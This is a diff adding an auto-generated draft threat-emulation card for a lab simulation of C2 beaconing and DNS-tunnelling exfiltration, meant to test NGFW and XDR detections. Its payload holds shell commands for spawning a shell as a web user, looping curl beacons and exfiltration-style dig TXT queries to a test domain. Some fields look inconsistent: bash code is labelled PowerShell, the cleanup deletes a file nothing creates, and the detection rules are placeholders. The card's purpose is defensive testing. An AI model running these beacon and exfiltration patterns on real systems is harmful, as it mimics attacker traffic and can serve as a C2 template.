@@ -1,0 +1,278 @@
+{
+  "id": "TTP-2026-0047",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-05-20T21:16:12+00:00",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "auto-generated",
+      "skeleton-draft",
+      "severity-high",
+      "needs-detection-engineering-review"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "ransomware-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "windows"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "C2 Beacon Callback \u2014 NGFW + XDR Stitch Validation",
+    "summary": "Auto-generated draft from CortexSim scenario SIM-MP-001. Plane: ANALYTICS. Primary technique: T1071.001. Requires human enrichment of BIOC logic + panw_mapping rule_ids.",
+    "description": "Auto-generated draft from CortexSim scenario SIM-MP-001. Plane: ANALYTICS. Primary technique: T1071.001. Requires human enrichment of BIOC logic + panw_mapping rule_ids.\n\nSource scenario: SIM-MP-001.\nUC: Cross-Plane Incident Stitching / TC: NGFW Session + XDR Process Lineage Correlation.",
+    "severity": "high",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ]
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1071",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ],
+        "subtechnique_id": "T1071.001"
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ],
+        "subtechnique_id": "T1059.004"
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": []
+  },
+  "execution": {
+    "target_platform": "cross-platform",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1071.001 (TODO \u2014 pin atomic test ref)",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Lab environment matching scenario SIM-MP-001 requirements."
+      }
+    ],
+    "payload": {
+      "interpreter": "powershell",
+      "code": "# step-1: Endpoint: spawn interactive shell from web service\necho '[MP-001] XDR side: simulating web-app-spawned shell';\nbash -c 'id; whoami; uname -a' 2>&1;\necho '[*] This command produces a BIOC on XDR for \"shell spawned from www-data\"'\n# step-2: Endpoint: HTTP beacon callback to known-bad test domain\necho '[MP-001] Network side: repeated outbound HTTP to known-bad indicator';\nfor i in 1 2 3 4 5; do\n  curl -sSL -m 10 -A 'Mozilla/5.0 (compatible; CortexSimBeacon/1.0)' \\\n    \"http://testmynids.org/uid/index.html?beacon=$i\" -o /dev/null || true;\n  sleep 12;\ndone\necho '[*] NGFW should flag repetitive beaconing pattern from DMZ endpoint'\n# step-3: DNS tunneling exfil pattern\necho '[MP-001] DNS side: short-TTL TXT queries simulating data exfiltration';\nfor i in $(seq 1 20); do\n  dig +short TXT \"exfil-$(echo -n \"payload_chunk_$i\" | base32 | tr -d = | head -c 30).testmynids.org\" @1.1.1.1 > /dev/null || true;\n  sleep 1;\ndone\necho '[*] NGFW DNS analytics should flag anomalous TXT volume with high-entropy labels'",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching curl (heuristic from scenario step step-02)",
+        "expected_value": "process_name CONTAINS \"curl\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound HTTP(S) request from the scenario step",
+        "expected_value": "dst_port IN (80, 443) AND src_host = scenario_target"
+      }
+    ],
+    "cleanup": {
+      "interpreter": "powershell",
+      "code": "rm -f /tmp/cortexsim_stage2.sh\necho '[CortexSim] SIM-MP-001 cleanup complete - no persistent artifacts'"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [
+      {
+        "name": "XDR \u2014 interactive bash spawned from www-data service context",
+        "description": "XDR \u2014 interactive bash spawned from www-data service context",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1059.004\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1059.004"
+        ]
+      },
+      {
+        "name": "NGFW \u2014 repetitive HTTP beacon to testmynids.org (known IOC list)",
+        "description": "NGFW \u2014 repetitive HTTP beacon to testmynids.org (known IOC list)",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1071.001\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ]
+      },
+      {
+        "name": "XDR \u2014 curl executed from www-data with suspicious user-agent",
+        "description": "XDR \u2014 curl executed from www-data with suspicious user-agent",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1071.001\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ]
+      },
+      {
+        "name": "XSIAM correlation \u2014 NGFW outbound session + XDR process event sharing src_host + session_time stitched into single...",
+        "description": "XSIAM correlation \u2014 NGFW outbound session + XDR process event sharing src_host + session_time stitched into single incident",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1071.001\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ]
+      },
+      {
+        "name": "NGFW \u2014 DNS anomaly: high TXT query volume with high-entropy labels",
+        "description": "NGFW \u2014 DNS anomaly: high TXT query volume with high-entropy labels",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1572\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1572"
+        ]
+      },
+      {
+        "name": "XDR \u2014 repetitive dig invocation from service account",
+        "description": "XDR \u2014 repetitive dig invocation from service account",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1572\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1572"
+        ]
+      },
+      {
+        "name": "XSIAM stitching \u2014 DNS exfil pattern correlated with process lineage into unified exfiltration incident",
+        "description": "XSIAM stitching \u2014 DNS exfil pattern correlated with process lineage into unified exfiltration incident",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1572\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1572"
+        ]
+      },
+      {
+        "name": "NGFW \u2014 download from IOC-listed domain matching threat intel feed",
+        "description": "NGFW \u2014 download from IOC-listed domain matching threat intel feed",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1105\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1105"
+        ]
+      },
+      {
+        "name": "XDR \u2014 file written to /tmp/ by curl from service account",
+        "description": "XDR \u2014 file written to /tmp/ by curl from service account",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1105\n// Multi-plane correlation \u2014 combine BIOCs across planes\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1105"
+        ]
+      }
+    ],
+    "xql_queries": [],
+    "correlation_rules": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xsiam",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-ANALYTICS-0047"
+        ],
+        "license_required": "pro"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-ANALYTICS-0047"
+        ],
+        "license_required": "pro"
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-RANSOM-047",
+        "name": "Cross-Plane Incident Stitching",
+        "description": "Cross-Plane Incident Stitching",
+        "test_cases": [
+          {
+            "test_case_id": "TC-RANSOM-047A",
+            "objective": "TBD \u2014 author concrete pass/fail criteria",
+            "success_criteria": [
+              "TBD \u2014 author at least one verifiable success criterion"
+            ],
+            "expected_score_weight": 1.0
+          }
+        ]
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit42 - Cobalt Strike Beacon Network Analysis",
+      "url": "https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/",
+      "publisher": "Unit42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1071.001",
+      "url": "https://attack.mitre.org/techniques/T1071/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-MP-001."
+    }
+  ]
+}
